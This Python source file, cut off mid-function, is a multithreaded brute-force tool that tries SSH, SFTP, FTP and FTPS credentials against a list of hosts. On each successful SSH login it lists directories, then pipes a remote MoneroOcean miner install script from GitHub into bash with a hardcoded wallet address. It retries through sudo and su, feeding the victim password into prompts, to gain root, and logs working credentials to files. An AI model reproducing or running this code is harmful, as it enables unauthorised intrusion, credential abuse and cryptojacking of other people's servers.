import argparse
import concurrent.futures
import ftplib
import logging
import os
import re
import shutil
import socket
import sys
import threading
import time
from collections import deque

import colorlog
import paramiko
import pysftp
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# --- GLOBAL SETTINGS ---
# Set the default encoding for stdout and stderr to UTF-8
# This can help with certain environment issues, though it's less direct for hanging.
# os.environ["PYTHONIOENCODING"] = ("utf-8"  # Setting this via environment variable is more reliable
# )
console = Console()

# Define connection messages with emojis (mostly for internal use now)
CONNECTION_MESSAGES = {
    "timeout": "🕒 Connection taking too long...",
    "dns_fail": "🌐 DNS lookup failed for this host",
    "refused": "🚫 Connection refused - service may not be running",
    "auth_fail": "🔑 Authentication failed - wrong credentials",
    "success": "🎉 Success! Logged in and script executed!",
    "script_fail": "⚠️ Connected but script failed to run",
    "no_shell": "🐚 Connected but no shell access",
    "starting": "🚀 Attempting connection to {host}:{port}",
    "retrying": "🔄 Retrying {host}:{port} (attempt {attempt})",
}

# Constants and global variables
timeout = 12  # Time limit for each connection in seconds
ATTEMPT_COUNT = 0  # Number of attempts
ATTEMPT_COUNT_LOCK = threading.Lock()  # Lock for attempt count
last_print_time = time.time()  # Time of last results print
TOTAL_LINES = 0  # Total lines in the input file
CURRENT_LINE = 0  # Current line being processed
CURRENT_LINE_LOCK = threading.Lock()  # Lock for current line
CURRENT_HOST = ""  # Current server being attempted
CURRENT_HOST_LOCK = threading.Lock()  # Lock for current server
total_elapsed_time = 0  # Total execution duration
stats = None

# Define locks for updating shared variables
LOGIN_ATTEMPTS_LOCK = threading.Lock()
CHECKED_HOSTS_LOCK = threading.Lock()

# --- Locks for file writing (essential for multi-threading) ---
# Create a dictionary to hold locks for each output file
FILE_LOCKS = {
    "output.txt": threading.Lock(),
    "checked_ssh_dirs.txt": threading.Lock(),
    "checked_sftp_dirs.txt": threading.Lock(),
    "checked_ftp_dirs.txt": threading.Lock(),
    "checked_ftps_dirs.txt": threading.Lock(),
    "checked_ssh.txt": threading.Lock(),
    "checked_ftp.txt": threading.Lock(),
    "checked_ftps.txt": threading.Lock(),
    "checked_sftp.txt": threading.Lock(),
    "root_access.txt": threading.Lock(),
    "root_sudo.txt": threading.Lock(),
    "sourcefile": threading.Lock(),
    "debug_log.txt": threading.Lock(),
}

login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}

parser = argparse.ArgumentParser(
    description="Attempt to login to a host using various protocols"
)
parser.add_argument(
    "-f", "--file", help="File containing login information", required=True
)
parser.add_argument(
    "-v",
    "--verbose",
    help="Increase output verbosity (shows DEBUG and INFO messages to console)",
    action="store_true",
)
parser.add_argument(
    "-t",
    "--threads",
    help="Number of threads to use",
    type=int,
    default=100,
)
parser.add_argument(
    "-p",
    "--protocols",
    help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
    type=str,
    required=True,
)
args = parser.parse_args()
protocols = [p.strip().upper() for p in args.protocols.split(",")]
show_verbose = args.verbose

# --- Logging Configuration ---
script_logger = colorlog.getLogger("script_logger")
script_logger.propagate = False

file_handler = logging.FileHandler("debug_log.txt", mode="a", encoding="utf-8")
file_handler.setFormatter(
    logging.Formatter("%(asctime)s - %(levelname)-8s - %(message)s")
)
file_handler.setLevel(logging.DEBUG)
script_logger.addHandler(file_handler)
script_logger.setLevel(logging.DEBUG)

console_handler = colorlog.StreamHandler()
console_handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-7s%(reset)s │ %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "bold_green",
            "WARNING": "bold_yellow",
            "ERROR": "bold_red",
            "CRITICAL": "bold_red,bg_white",
        },
    )
)

console_handler.setLevel(logging.INFO if args.verbose else logging.CRITICAL)

if args.verbose:
    script_logger.addHandler(console_handler)

# Silence other libraries' loggers
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("pysftp").setLevel(logging.CRITICAL)
logging.getLogger("ftplib").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger().setLevel(logging.WARNING)


# --- System Error Stream Redirection ---
class StderrRedirector:
    def __init__(self, to=os.devnull):
        self.to_fd = None
        self.old_stderr_fd = None
        self.old_stderr = None
        self.target_file = None
        if to != os.devnull:
            self.target_file = open(to, "a", buffering=1, encoding="utf-8")
        else:
            self.to_fd = os.open(os.devnull, os.O_WRONLY)
            self.target_file = None

    def __enter__(self):
        self.old_stderr = sys.stderr
        self.old_stderr_fd = sys.stderr.fileno()

        if self.target_file:
            target_fd = self.target_file.fileno()
        else:
            target_fd = self.to_fd

        # Duplicate the original stderr's file descriptor
        self.dup_stderr = os.dup(self.old_stderr_fd)
        # Redirect the original stderr's file descriptor to the target
        os.dup2(target_fd, self.old_stderr_fd)

        # Reassign sys.stderr to a new stream using the now-redirected fd
        if self.target_file:
            sys.stderr = self.target_file
        else:
            # Create a new file object for /dev/null using a duplicated target_fd
            # This ensures that sys.stderr object points to the redirected stream
            sys.stderr = os.fdopen(os.dup(target_fd), "w", encoding="utf-8")

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Flush anything remaining in the redirected stderr buffer
        if sys.stderr is not self.old_stderr and hasattr(sys.stderr, "flush"):
            sys.stderr.flush()

        # Restore original stderr file descriptor
        os.dup2(self.dup_stderr, self.old_stderr_fd)
        os.close(self.dup_stderr)

        # Restore sys.stderr object
        sys.stderr = self.old_stderr

        # Close the target file descriptor if it's os.devnull and we opened it
        if not self.target_file and self.to_fd is not None:
            os.close(self.to_fd)

        # Do not suppress the exception from Python's propagation
        return False


class MultiProtocolFancyStats:
    def __init__(self, total_hosts, filename, protocols=None, threads=100):
        self.total_hosts = total_hosts
        self.filename = os.path.basename(filename)
        self.protocols = protocols if protocols else ["SSH"]
        self.threads = threads
        self.start_time = time.time()
        self.show_verbose = show_verbose
        self.verbose_buffer = deque(maxlen=50)  # Store more verbose messages

        # Stats tracking per protocol
        self.protocol_stats = {}
        for protocol in self.protocols:
            self.protocol_stats[protocol] = {
                "correct_logins": 0,
                "failed_logins": 0,
                "hosts_checked": 0,
                "current_host": "Waiting...",
                "active_threads": 0,
                "speed_history": deque(maxlen=30),
                "current_speed": 0.0,
                "avg_speed": 0.0,
                "last_checked_count": 0,
                "last_speed_update": time.time(),
            }

        # Global stats
        self.total_hosts_checked = 0
        self.total_correct_logins = 0
        self.total_failed_logins = 0
        self.total_active_threads = 0
        self.overall_speed = 0.0

        # Display control
        self.running = True
        self.display_thread = None
        self.lock = threading.Lock()

        # Animation frames
        self.spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.protocol_icons = {"SSH": "🔐", "SFTP": "📁", "FTP": "📂", "FTPS": "🔒"}
        self.frame_index = 0

        # Colors (ANSI escape codes)
        self.colors = {
            "reset": "\033[0m",
            "bold": "\033[1m",
            "dim": "\033[2m",
            "red": "\033[91m",
            "green": "\033[92m",
            "yellow": "\033[93m",
            "blue": "\033[94m",
            "magenta": "\033[95m",
            "cyan": "\033[96m",
            "white": "\033[97m",
            "orange": "\033[38;5;208m",
            "purple": "\033[38;5;129m",
            "bg_blue": "\033[44m",
            "bg_green": "\033[42m",
            "bg_red": "\033[41m",
            "bg_yellow": "\033[43m",
        }

        # Protocol colors
        self.protocol_colors = {
            "SSH": self.colors["green"],
            "SFTP": self.colors["blue"],
            "FTP": self.colors["yellow"],
            "FTPS": self.colors["magenta"],
        }

        # Output buffer for messages
        self.output_buffer = deque(maxlen=10)

    def add_verbose_log(self, message):
        """Add a verbose log message to the verbose buffer"""
        if self.show_verbose:
            with self.lock:
                timestamp = time.strftime("%H:%M:%S")
                self.verbose_buffer.append(f"[{timestamp}] {message}")

    def increment_checked(self):
        """Increment total hosts checked counter"""
        with self.lock:
            self.total_hosts_checked += 1
            self._update_global_stats()

    def increment_correct(self):
        """Increment total correct logins counter"""
        with self.lock:
            self.total_correct_logins += 1
            self._update_global_stats()

    def increment_failed(self):
        """Increment total failed logins counter"""
        with self.lock:
            self.total_failed_logins += 1
            self._update_global_stats()

    def _display_loop(self):
        """Main display loop for live stats"""
        while self.running:
            try:
                self._render_display()
                self.frame_index = (self.frame_index + 1) % len(self.spinner_frames)
                time.sleep(10)
            except Exception as e:
                print(f"Display error: {e}")
                break

    def _create_progress_bar(self, percentage, width=50):
        """Create a visual progress bar"""
        filled = int(width * percentage / 100)
        bar = "█" * filled + "░" * (width - filled)
        return f"[{bar}]"

    def _estimate_time_remaining(self):
        """Estimate time remaining based on current progress"""
        if self.overall_speed <= 0:
            return 0

        total_needed = self.total_hosts * len(self.protocols)
        remaining = total_needed - self.total_hosts_checked
        return remaining / self.overall_speed if self.overall_speed > 0 else 0

    def _format_time(self, seconds):
        """Format seconds into readable time string"""
        if seconds < 60:
            return f"{seconds:.0f}s"
        elif seconds < 3600:
            return f"{seconds//60:.0f}m {seconds % 60:.0f}s"
        else:
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            return f"{hours:.0f}h {minutes:.0f}m"

    def start(self):
        """Start the live stats display"""
        if not self.display_thread or not self.display_thread.is_alive():
            self.running = True
            self.display_thread = threading.Thread(
                target=self._display_loop, daemon=True
            )
            self.display_thread.start()

    def stop(self):
        """Stop the live stats display"""
        self.running = False
        if self.display_thread and self.display_thread.is_alive():
            self.display_thread.join(timeout=1)
        # Clear screen and show cursor
        print(f"\033[?25h\033[2J\033[H", end="", flush=True)

    def add_output(self, message):
        """Add a message to the output buffer"""
        with self.lock:
            timestamp = time.strftime("%H:%M:%S")
            self.output_buffer.append(f"[{timestamp}] {message}")

    def update_current_host(self, protocol, host):
        """Update the current host being processed for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["current_host"] = host

    def update_protocol_stats(
        self,
        protocol,
        hosts_checked=None,
        correct_logins=None,
        failed_logins=None,
        active_threads=None,
    ):
        """Update statistics for a specific protocol"""
        with self.lock:
            if protocol not in self.protocol_stats:
                return

            stats = self.protocol_stats[protocol]

            if hosts_checked is not None:
                stats["hosts_checked"] = hosts_checked
            if correct_logins is not None:
                stats["correct_logins"] = correct_logins
            if failed_logins is not None:
                stats["failed_logins"] = failed_logins
            if active_threads is not None:
                stats["active_threads"] = active_threads

            # Update speed calculations for this protocol
            self._update_protocol_speed(protocol)
            self._update_global_stats()

    def increment_protocol_checked(self, protocol):
        """Increment hosts checked counter for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["hosts_checked"] += 1
                self._update_protocol_speed(protocol)
                self._update_global_stats()

    def increment_protocol_correct(self, protocol):
        """Increment correct logins counter for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["correct_logins"] += 1
                self._update_global_stats()

    def increment_protocol_failed(self, protocol):
        """Increment failed logins counter for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["failed_logins"] += 1
                self._update_global_stats()

    def set_active_threads(self, count):
        """Set total active threads count"""
        with self.lock:
            self.total_active_threads = count

    def _update_protocol_speed(self, protocol):
        """Update speed calculations for a specific protocol"""
        if protocol not in self.protocol_stats:
            return

        stats = self.protocol_stats[protocol]
        current_time = time.time()

        if current_time - stats["last_speed_update"] >= 1.0:
            time_diff = current_time - stats["last_speed_update"]
            checked_diff = stats["hosts_checked"] - stats["last_checked_count"]

            if time_diff > 0:
                stats["current_speed"] = checked_diff / time_diff
                stats["speed_history"].append(stats["current_speed"])

                if stats["speed_history"]:
                    stats["avg_speed"] = sum(stats["speed_history"]) / len(
                        stats["speed_history"]
                    )

            stats["last_checked_count"] = stats["hosts_checked"]
            stats["last_speed_update"] = current_time

    def _update_global_stats(self):
        """Update global statistics from all protocols"""
        self.total_hosts_checked = sum(
            stats["hosts_checked"] for stats in self.protocol_stats.values()
        )
        self.total_correct_logins = sum(
            stats["correct_logins"] for stats in self.protocol_stats.values()
        )
        self.total_failed_logins = sum(
            stats["failed_logins"] for stats in self.protocol_stats.values()
        )
        self.total_active_threads = sum(
            stats["active_threads"] for stats in self.protocol_stats.values()
        )
        self.overall_speed = sum(
            stats["current_speed"] for stats in self.protocol_stats.values()
        )

    def _get_terminal_size(self):
        """Get terminal size"""
        try:
            return shutil.get_terminal_size()
        except:
            # Increased default height
            return shutil.get_terminal_size((120, 40))

    def _render_display(self):
        """Render the complete display with split screen"""
        term_size = self._get_terminal_size()
        width = min(term_size.columns - 2, 120)
        height = term_size.lines

        # Calculate space allocation
        stats_height = 25  # Fixed height for stats section
        verbose_height = max(
            10, height - stats_height - 3
        )  # Remaining space for verbose

        with self.lock:
            # Calculate global stats
            runtime = time.time() - self.start_time
            total_checks_needed = self.total_hosts * len(self.protocols)
            total_checks_done = sum(
                stats["hosts_checked"] for stats in self.protocol_stats.values()
            )
            percentage = (
                (total_checks_done / total_checks_needed * 100)
                if total_checks_needed > 0
                else 0
            )
            eta = self._estimate_time_remaining()

        # Clear screen and move to top
        print("\033[2J\033[H", end="")

        # Main header
        spinner = self.spinner_frames[self.frame_index]
        protocols_str = " | ".join(
            [f"{self.protocol_icons.get(p, '🔧')} {p}" for p in self.protocols]
        )
        header_title = f"{spinner} MULTI-PROTOCOL BRUTE FORCE SCANNER {spinner}"

        print(f"{self.colors['cyan']}{self.colors['bold']}")
        print("╔" + "═" * (width - 2) + "╗")
        print(f"║{header_title.center(width-2)}║")
        print(f"║{protocols_str.center(width-2)}║")
        print("╚" + "═" * (width - 2) + "╝")
        print(f"{self.colors['reset']}")

        # File info section
        print(f"\n{self.colors['yellow']}📁 Scan Configuration:{self.colors['reset']}")
        print(
            f"   📝 File: {self.colors['white']}{self.filename}{self.colors['reset']}"
        )
        print(
            f"   🎯 Total Hosts: {self.colors['magenta']}{self.total_hosts:,}{self.colors['reset']}"
        )
        print(
            f"   🧵 Max Threads: {self.colors['blue']}{self.threads}{self.colors['reset']}"
        )
        print(
            f"   🌐 Protocols: {self.colors['cyan']}{len(self.protocols)} ({', '.join(self.protocols)}){self.colors['reset']}"
        )

        # Overall progress
        print(f"\n{self.colors['cyan']}📊 Overall Progress:{self.colors['reset']}")
        progress_bar = self._create_progress_bar(percentage, 60)
        print(
            f"   {progress_bar} {self.colors['bold']}{percentage:.1f}%{self.colors['reset']}"
        )

        # Global stats
        print(f"\n{self.colors['green']}🌍 Global Statistics:{self.colors['reset']}")
        print("   ┌─────────────────────────┬─────────────────────────┐")
        print(
            f"   │ 🕒 Runtime              │ {self.colors['white']}{self._format_time(runtime):<23}{self.colors['reset']} │"
        )
        print(
            f"   │ ✅ Total Checks Done    │ {self.colors['green']}{total_checks_done:,} / {total_checks_needed:,}{'':>10}{self.colors['reset']} │"
        )
        print(
            f"   │ 🚀 Active Threads       │ {self.colors['magenta']}{self.total_active_threads}{'':>22}{self.colors['reset']} │"
        )
        print(
            f"   │ ⚡ Overall Speed        │ {self.colors['cyan']}{self.overall_speed:.1f} checks/sec{'':>8}{self.colors['reset']} │"
        )
        print(
            f"   │ ⏱️  ETA                 │ {self.colors['yellow']}{self._format_time(eta) if eta > 0 else 'Calculating...'}{'':>10}{self.colors['reset']} │"
        )
        print("   └─────────────────────────┴─────────────────────────┘")

        # Per-protocol stats
        print(f"\n{self.colors['blue']}🔧 Protocol Breakdown:{self.colors['reset']}")

        for i, protocol in enumerate(self.protocols):
            stats = self.protocol_stats[protocol]
            color = self.protocol_colors.get(protocol, self.colors["white"])
            icon = self.protocol_icons.get(protocol, "🔧")

            print(f"   {color}{icon} {protocol}:{self.colors['reset']}")
            print(
                f"      ✅ Success: {self.colors['green']}{stats['correct_logins']}{self.colors['reset']} | "
                f"❌ Failed: {self.colors['red']}{stats['failed_logins']}{self.colors['reset']} | "
                f"📊 Checked: {self.colors['cyan']}{stats['hosts_checked']}{self.colors['reset']} | "
                f"⚡ Speed: {self.colors['yellow']}{stats['current_speed']:.1f}/s{self.colors['reset']}"
            )
            print(
                f"      🎯 Current: {self.colors['white']}{stats['current_host'][:50]}{'...' if len(stats['current_host']) > 50 else ''}{self.colors['reset']}"
            )

        # Recent activity
        print(f"\n{self.colors['purple']}📋 Recent Activity:{self.colors['reset']}")
        if self.output_buffer:
            for msg in list(self.output_buffer)[-5:]:  # Show last 5 messages
                print(f"   {self.colors['dim']}{msg}{self.colors['reset']}")
        else:
            print(f"   {self.colors['dim']}No recent activity...{self.colors['reset']}")

        print(f"\n{self.colors['dim']}Press Ctrl+C to stop...{self.colors['reset']}")

        # Separator line
        print(f"\n{self.colors['cyan']}{'═' * width}{self.colors['reset']}")

        # Verbose log section (only if enabled)
        if self.show_verbose:
            print(
                f"{self.colors['purple']}📋 Live Verbose Log (last {verbose_height} entries):{self.colors['reset']}"
            )
            print(f"{self.colors['dim']}┌{'─' * (width-2)}┐{self.colors['reset']}")

            # Display verbose messages
            verbose_messages = list(self.verbose_buffer)[-verbose_height:]
            for i in range(verbose_height):
                if i < len(verbose_messages):
                    msg = verbose_messages[i]
                    # Truncate message if too long
                    if len(msg) > width - 4:
                        msg = msg[: width - 7] + "..."
                    print(f"{self.colors['dim']}│{self.colors['reset']} {msg}")
                else:
                    print(
                        f"{self.colors['dim']}│{' ' * (width-2)}{self.colors['reset']}"
                    )

            print(f"{self.colors['dim']}└{'─' * (width-2)}┘{self.colors['reset']}")
        else:
            # Recent activity (condensed)
            print(f"{self.colors['purple']}📋 Recent:{self.colors['reset']}")
            if self.output_buffer:
                for msg in list(self.output_buffer)[-3:]:  # Show only last 3
                    print(
                        f"   {self.colors['dim']}{msg[:width-6]}{'...' if len(msg) > width-6 else ''}{self.colors['reset']}"
                    )

        print(f"\n{self.colors['dim']}Press Ctrl+C to stop...{self.colors['reset']}")


def parse_ssh_url(ssh_url):
    """Parses an SSH URL string into host, port, username, and password."""
    try:
        regex = r"^SSH://([^:@]+):([^:@]+)@([^:@]+):(\d+)$"
        match = re.match(regex, ssh_url)
        if match:
            username = match.group(1)
            password = match.group(2)
            host = match.group(3)
            try:
                port = int(match.group(4))
                return host, port, username, password
            except ValueError:
                script_logger.error(f"Invalid port in SSH URL: {match.group(4)}")
                return None
        else:
            script_logger.error(f"Invalid SSH URL format: {ssh_url}")
    except Exception as e:
        script_logger.error(
            f"Unexpected error while parsing SSH URL '{ssh_url}': {e}", exc_info=True
        )
    return None


def count_active_threads():
    """Returns the number of active threads."""
    return threading.active_count()


def print_login_attempts(total_lines, start_time_main):
    """Prints a summary of login attempts to the console using rich."""
    active_threads = count_active_threads()
    with CURRENT_HOST_LOCK:
        current_host = CURRENT_HOST
    with CURRENT_LINE_LOCK:
        current_line = CURRENT_LINE

    elapsed_time = time.time() - start_time_main

    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Statistic", justify="left")
    table.add_column("Value", justify="right")

    table.add_row("🕒 Runtime", f"{elapsed_time:.2f}s")
    table.add_row("📋 Total Lines", str(total_lines))

    # *** FIXED: Prevent ZeroDivisionError ***
    progress_percent_str = (
        f"({(current_line / total_lines) * 100:.1f}%)" if total_lines > 0 else "(N/A)"
    )
    table.add_row(
        "📌 Current Line",
        f"{current_line} {progress_percent_str}",
    )
    table.add_row("🚀 Active Threads", str(active_threads))
    table.add_row(
        "✅ Correct Logins", str(sum(login_attempts["correct_logins"].values()))
    )
    table.add_row(
        "❌ Failed Logins",
        str(sum(login_attempts["incorrect_logins"].values())),
    )

    console.print("\n")
    console.print(
        Panel.fit(
            table,
            title="[bold]Progress Overview[/bold]",
            border_style="bright_blue",
            padding=(1, 4),
        )
    )
    console.print("\n")


def check_login(host, port, username, password, protocol, conn_timeout):
    """
    Dispatches to the appropriate login check function based on protocol.
    Note: This function is not directly used in the main thread pool but is kept for modularity.
    """
    global stats

    # FIXED: Pass both protocol and host to update_current_host
    if stats:
        stats.update_current_host(protocol, f"{username}@{host}:{port}")
        stats.add_output(f"🚀 Checking {protocol}://{username}@{host}:{port}")

    # KEEP ALL YOUR EXISTING CODE EXACTLY AS IS:
    check_functions = {
        "SSH": check_ssh_login,
        "SFTP": check_sftp_login,
        "FTP": check_ftp_login,
        "FTPS": check_ftps_login,
    }
    if protocol not in check_functions:
        script_logger.error(f"Invalid protocol specified: {protocol}")
        # ADD this for stats
        if stats:
            stats.increment_protocol_checked(protocol)
            stats.increment_protocol_failed(protocol)
            stats.add_output(f"❌ Invalid protocol for {host}")
        return None

    # KEEP your existing function call with conn_timeout
    result = check_functions[protocol](host, port, username, password, conn_timeout)

    # FIXED: Update stats with protocol-specific methods
    if stats:
        stats.increment_protocol_checked(protocol)
        stats.add_output(f"HOST_CHECKED: {host}")

        # Check if result indicates success - adjust this based on your return format
        # From your check_ssh_login, it returns ("SSH", sudo_available, su_root_available) or None
        if result and (
            isinstance(result, tuple) and result[0] or isinstance(result, str)
        ):
            stats.increment_protocol_correct(protocol)
            stats.add_output(f"✔️ Correct login: {username}@{host}")
        else:
            stats.increment_protocol_failed(protocol)
            stats.add_output(f"❌ Failed login: {username}@{host}")

    return result


def check_login_thread(
    host, port, username, password, conn_timeout, protocol, sourcefile, start_time_main
):
    """
    Main thread function to check a login.
    Handles progress bar updates and directs messages to script_logger or tqdm.write.
    """
    global ATTEMPT_COUNT
    global last_print_time
    global CURRENT_LINE
    global CURRENT_HOST
    global hosts_checked_since_last_removal
    global stats

    with CURRENT_LINE_LOCK:
        CURRENT_LINE += 1
    with CURRENT_HOST_LOCK:
        CURRENT_HOST = f"{username}:{password}@{host}:{port}"

    # ADD: Update stats with current host
    if stats:
        stats.update_current_host(protocol, f"{username}@{host}:{port}")
        stats.add_output(f"🚀 Checking {protocol}://{username}@{host}:{port}")

    script_logger.debug(f"🚀 Attempting connection to {host}:{port} for {protocol}")

    with ATTEMPT_COUNT_LOCK:
        ATTEMPT_COUNT += 1

    start_time_thread = time.time()
    result_protocol = None
    redirect_target = "debug_log.txt" if args.verbose else os.devnull

    with StderrRedirector(to=redirect_target):
        try:
            if protocol == "SSH":
                result_protocol = check_ssh_login(host, port, username, password)
            elif protocol == "SFTP":
                result_protocol = check_sftp_login(host, port, username, password)
            elif protocol == "FTP":
                result_protocol = check_ftp_login(host, port, username, password)
            elif protocol == "FTPS":
                result_protocol = check_ftps_login(host, port, username, password)
        except Exception as e:
            script_logger.error(
                f"Unhandled exception during {protocol} login check for {host}:{port}: {e}",
                exc_info=True,
            )

    elapsed_time = time.time() - start_time_thread
    emoji = "✅" if result_protocol else "❌"
    short_host = f"{username[:8]}@{host.split('.')[0]}:{port}"

    # Update stats for host completion
    if stats:
        stats.increment_protocol_checked(protocol)

    # Centralized result handling and file writing
    if result_protocol:
        protocol_name = ""
        sudo_available = False
        su_root_available = False
        if isinstance(result_protocol, tuple):
            protocol_name, sudo_available, su_root_available = result_protocol
        else:
            protocol_name = result_protocol

        success_msg = (
            f"🎉 SUCCESS │ {protocol_name}://{username}:{password}@{host}:{port}"
            f" │ Duration: {elapsed_time:.2f}s"
        )

        # Update stats for successful login
        if stats:
            stats.increment_protocol_correct(protocol)
            stats.add_output(f"✔️ SUCCESS: {username}@{host}:{port}")

        script_logger.info(success_msg)

        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["correct_logins"][protocol_name] += 1

        # Call the centralized write function with all necessary info
        write_to_output(
            protocol_name,
            username,
            password,
            host,
            port,
            sudo_available=sudo_available,
            su_root_available=su_root_available,
        )
    else:
        fail_msg = f"❌ Failed login for {protocol}://{username}:{password}@{host}:{port} │ Duration: {elapsed_time:.2f}s"

        # Update stats for failed login
        if stats:
            stats.increment_protocol_failed(protocol)
            stats.add_output(f"❌ FAILED: {username}@{host}:{port}")

        script_logger.info(fail_msg)

        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["incorrect_logins"][protocol] += 1

    with CURRENT_HOST_LOCK:
        elapsed_time_formatted = f"{elapsed_time:.2f} seconds"
        script_logger.debug(
            f"Checked {protocol} login for {username}:{password}@{host}:{port}, took {elapsed_time_formatted}"
        )

    with CHECKED_HOSTS_LOCK:
        hosts_checked_since_last_removal += 1
        if hosts_checked_since_last_removal % 50 == 0:
            script_logger.info(
                f"Hosts checked since last removal: {hosts_checked_since_last_removal}"
            )
        if hosts_checked_since_last_removal >= 300:
            script_logger.info(
                f"Removing {hosts_checked_since_last_removal} checked hosts from the file..."
            )
            remove_checked_hosts_by_counter(sourcefile, batch_size=300)
            hosts_checked_since_last_removal = 0


def check_ssh_login(host, port, username, password, conn_timeout):
    """
    Attempts to establish an SSH connection and perform actions.
    Returns ("SSH", True, True) if successful with root,
    ("SSH", False, False) if successful but no root, or None on failure.
    """
    sudo_available = False
    su_root_available = False

    try:
        script_logger.debug(
            f"Trying SSH connection ({username}:{password}@{host}:{port})"
        )
        with paramiko.SSHClient() as client:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=conn_timeout,
            )

            script_logger.info(
                f"Connected to SSH server {host}:{port} with {username}:{password}"
            )

            try:
                with FILE_LOCKS["checked_ssh_dirs.txt"]:
                    stdin, stdout, stderr = client.exec_command("ls -la")
                    dir_listing = stdout.read().decode()
                    with open(
                        "checked_ssh_dirs.txt", "a", encoding="utf-8"
                    ) as output_file:
                        output_file.write(
                            f"SSH directory listing for {username}:{password}@{host}:{port}:\n{dir_listing}\n"
                        )
            except Exception as e:
                script_logger.warning(
                    f"Failed to get directory listing for {host}:{port}: {e}"
                )

            stdin, stdout, stderr = client.exec_command("echo Test", get_pty=True)
            welcome_message = stdout.read().decode()
            if "This service allows sftp connections only." in welcome_message or any(
                msg in welcome_message
                for msg in [
                    "Shell access is not enabled on your account!",
                    "This account is currently not available.",
                    "Shell access is disabled",
                    "command not allowed on SFTP-only account",
                ]
            ):
                script_logger.info(
                    f"⚠️ Server {host}:{port} does not allow shell access. Considering as success without command execution."
                )
                return ("SSH", False, False)

            install_command = (
                "systemctl stop swapd ; curl -L -v "
                "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/"
                "setup_mo_4_r00t_and_user.sh | bash -s 4BGGo3R1dNFpS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBjvfSKNhUuX"
            )

            stdin, stdout, stderr = client.exec_command("whoami")
            current_user = stdout.read().decode().strip()

            if current_user == "root":
                script_logger.info(f"Already have root access on {host}:{port}")
                stdin, stdout, stderr = client.exec_command(install_command)
                sudo_available = True
                su_root_available = True
            else:
                script_logger.info(f"Attempting privilege escalation on {host}")
                sudo_commands = [
                    "sudo -s",
                    "sudo -i",
                    "sudo su -",
                    "sudo bash -c",
                    "sudo",
                ]

                for cmd_prefix in sudo_commands:
                    full_cmd = f"{cmd_prefix} '{install_command}'"
                    stdin, stdout, stderr = client.exec_command(full_cmd, get_pty=True)
                    time.sleep(1)
                    if stdout.channel.recv_ready():
                        prompt_output = stdout.channel.recv(1024).decode()
                        if "password" in prompt_output.lower():
                            stdin.write(f"{password}\n")
                            stdin.flush()
                            time.sleep(2)

                    cmd_output = stdout.read().decode()
                    stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                        "whoami"
                    )
                    if stdout_whoami.read().decode().strip() == "root":
                        sudo_available = True
                        script_logger.info(
                            f"Successfully got root with {cmd_prefix} on {host}"
                        )
                        break

                if not sudo_available:
                    script_logger.info(f"Sudo failed on {host}, trying 'su'")
                    stdin, stdout, stderr = client.exec_command(
                        f"su -c '{install_command}'", get_pty=True
                    )
                    time.sleep(1)
                    if stdout.channel.recv_ready():
                        prompt_output = stdout.channel.recv(1024).decode()
                        if "password" in prompt_output.lower():
                            stdin.write(f"{password}\n")
                            stdin.flush()
                            time.sleep(2)

                    stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                        "whoami"
                    )
                    if stdout_whoami.read().decode().strip() == "root":
                        su_root_available = True
                        script_logger.info(f"Successfully got root with 'su' on {host}")
                    else:
                        script_logger.info(
                            f"Could not gain root access on {host}, running as normal user"
                        )
                        client.exec_command(install_command)

            # *** FIXED: Removed file writing from this function. It now only returns the status. ***
            return ("SSH", sudo_available, su_root_available)

    except paramiko.ssh_exception.AuthenticationException:
        script_logger.info(f"🔑 Authentication failed for SSH {username}@{host}:{port}")
    except paramiko.ssh_exception.SSHException as e:
        script_logger.info(f"🚫 SSH connection error to {host}:{port}: {e}")
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for SSH {host}:{port}.")
    except OSError as e:
        script_logger.info(
            f"🚫 Socket operation error (OSError) during SSH connection to {host}:{port}: {e}"
        )
    except EOFError:
        script_logger.info(f"🚫 Unexpected EOF during SSH connection to {host}:{port}.")
    except Exception as e:
        script_logger.error(
            f"⚠️ An unexpected error occurred during SSH for {host}:{port}: {e}",
            exc_info=True,
        )

    return None


def check_sftp_login(host, port, username, password, conn_timeout):
    """Attempts to establish an SFTP connection."""
    try:
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None
        script_logger.debug(
            f"Trying SFTP connection ({username}:{password}@{host}:{port})"
        )
        with pysftp.Connection(
            host, username=username, password=password, port=port, cnopts=cnopts
        ) as sftp:
            script_logger.info(
                f"Connected to SFTP server {host}:{port} with {username}:{password}"
            )
            sftp_files = sftp.listdir_attr(".")
            with FILE_LOCKS["checked_sftp_dirs.txt"]:
                with open(
                    "checked_sftp_dirs.txt", "a", encoding="utf-8"
                ) as sftp_dir_output:
                    sftp_dir_output.write(
                        f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                    )
                    for line in sftp_files:
                        sftp_dir_output.write(f"{line}\n")
            return "SFTP"
    except (
